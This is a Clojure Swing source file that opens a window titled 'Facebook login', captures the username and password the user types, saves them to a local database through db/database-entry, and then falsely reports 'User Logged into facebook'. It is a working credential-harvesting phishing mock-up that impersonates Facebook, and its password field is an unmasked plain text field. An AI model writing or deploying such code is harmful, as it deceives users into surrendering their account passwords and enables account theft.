(ns clj-proj.core
  (:gen-class)
  (:import [javax.swing JTextField])
  (:require
            [clj_proj.database :as db]))





;

(import '(javax.swing JFrame JLabel JTextField JOptionPane JButton)
  '(java.awt.event ActionListener)
  '(java.awt GridLayout Desktop)
  '(java.net URL ))

(let [frame (new JFrame "Facebook login")
      user-text (new JTextField)
      password-text (new JTextField)
      user-label (new JLabel "Username")
      login-button (new JButton "Login")
      password-label (new JLabel "Password")]
  (. login-button
    (addActionListener
      (proxy [ActionListener] []
        (actionPerformed [evt]
          (let [
                 username (. user-text (getText))
                 password (. password-text (getText))
                ]
            (. user-text (setText ""))
            (. password-text (setText ""))
            (db/database-entry username password)
            (JOptionPane/showMessageDialog  nil, "User Logged into facebook")
;            (.browse (URL. "http://www.facebook.com"))
            )))))

            (doto frame
    (.setDefaultCloseOperation (JFrame/EXIT_ON_CLOSE)) ;uncomment this line to quit app on frame close
    (.setLayout (new GridLayout 3 2 3 3))
    (.add user-label)
    (.add user-text)
    (.add password-label)
    (.add password-text)
    (.add login-button)
    (.setSize 300 120)
    (.setVisible true)))